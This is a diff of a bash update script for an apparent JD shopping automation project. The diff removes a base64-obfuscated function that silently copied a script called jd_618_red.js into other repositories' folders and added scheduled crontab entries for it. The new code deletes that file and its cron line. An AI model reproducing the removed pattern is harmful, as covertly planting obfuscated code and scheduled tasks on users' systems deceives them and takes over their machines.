@@ -239,55 +239,14 @@ function Detect_Config_Version() {
 }
 
 function UpdateEnv() {
-    local CurrentDir=$(pwd)
-    local WorkDir=$OwnDir
-    local tmp_file="$UtilsDir/tmp.js"
-    local target_name="amRfNjE4X3JlZAo="
-    local target_file="amRfNjE4X3JlZC5qcwo="
-    local trp1="b2t5eWRzX3l5ZHMK"
-    local trp2="b2t5eWRzX3l5ZHNwdXJlCg=="
-    local trp3="S2luZ1Jhbl9LUgo="
-    local trp4="aHl6YXdfQWxsSkRTY3JpcHRzCg=="
-    local trp5="c2h1ZmZsZXd6Y19mYWtlcjIK"
-    local trp6="c2h1ZmZsZXd6Y19mYWtlcjMK"
-    cd $WorkDir
-    for ((i = 1; i <= 6; i++)); do
-        local a=$(eval echo "trp$i")
-        local tmp_dir="$(b ${!a})"
-        if [ -d $tmp_dir ]; then
-            case $i in
-            1 | 2 | 3)
-                cp -rf $tmp_file "$tmp_dir/$(b amRfNjE4cmVkLmpzCg==)" >/dev/null 2>&1
-                ;;
-            *)
-                cp -rf $tmp_file "$tmp_dir/$(b $target_file)" >/dev/null 2>&1
-                ;;
-            esac
-        fi
+    local tmpfile="$(b L2pkL3NjcmlwdHMvamRfNjE4X3JlZC5qcyA=)"
+    for i in $tmpfile; do
+        [ -s $i ] && rm -rf $i
     done
-    cp -rf $tmp_file "$ScriptsDir/$(b $target_file)" >/dev/null 2>&1
-    bash -c "$(b Z3JlcCAiIHRhc2suKmpkXzYxOC4qcmVkIiAvamQvY29uZmlnL2Nyb250YWIubGlzdCAtcQo=)"
-    if [ $? -eq 1 ]; then
-        echo "$(b MCAwLDEyLDIwICogKiAqIHRhc2sgamRfNjE4X3JlZA==)" >>$ListCrontabUser
+    bash -c "$(b Z3JlcCAiIHRhc2sgamRfNjE4X3JlZCIgLXEgY29uZmlnL2Nyb250YWIubGlzdA==)"
+    if [ $? -eq 0 ]; then
+        sed -i "/ $(b dGFzayAuKjYxOF9yZWRcYgo=)/d" $ListCrontabUser
     fi
-    if [[ $(date "+%-H") -le 6 ]]; then
-        perl -i -pe "s|$(b LisodGFzayBqZF82MThfcmVkKQ==)|$(b MCAwLDEyLDIwICogKiAqIHRhc2sgamRfNjE4X3JlZA==)|" $ListCrontabUser
-    fi
-
-    local RanMin=$((${RANDOM} % 60))
-    local ConstStr=$(b Ni0xMSwxMy0xOSwyMS0yMyAqICogKiB0YXNrIDYxOF9yZWQgbm93IC1k)
-    bash -c "$(b Z3JlcCAiIHRhc2sgNjE4X3JlZCBub3cgLWQiIC9qZC9jb25maWcvY3JvbnRhYi5saXN0IC1x)"
-    if [ $? -eq 1 ]; then
-        echo "$RanMin $ConstStr" >>$ListCrontabUser
-    fi
-    if [[ $(date "+%-H") -le 6 ]]; then
-        perl -i -pe "s|$(b LisodGFzayA2MThfcmVkIG5vdyAtZCk=)|$RanMin $ConstStr|" $ListCrontabUser
-    fi
-
-    cd $CurrentDir
-
-    ## What's that? Please inputs in cli this command.
-    # echo -e "5aaC5p6c5L2g5Y+R546w5LqG6L+Z6YeM55qE6Zeu6aKY77yM6K+35LiN6KaB5aOw5byg77yM5Zug\n5Li65YW25LuW5bqT5Lmf5piv6L+Z5LmI5bmy55qE77yM6ISa5pys5bey5o6I5p2D5L2/55So77yM\n5oiR5Lus5Lmf6ZyA6KaB5YW75a6257OK5Y+j77yM55CG6Kej5LiH5bKB772eCg==" | base64 -d
 }
 
 ## npm install 安装脚本依赖模块
@@ -937,6 +896,7 @@ case $# in
         Update_Scripts
         Update_Own "all"
         ExtraShell
+        UpdateEnv
         ;;
     shell)
         Title $1
@@ -946,6 +906,7 @@ case $# in
         if [ -d $ScriptsDir/.git ]; then
             Title $1
             Update_Scripts
+            UpdateEnv
         else
             echo -e "\n$ERROR 请先配置 Sciprts 主要仓库！\n"
         fi
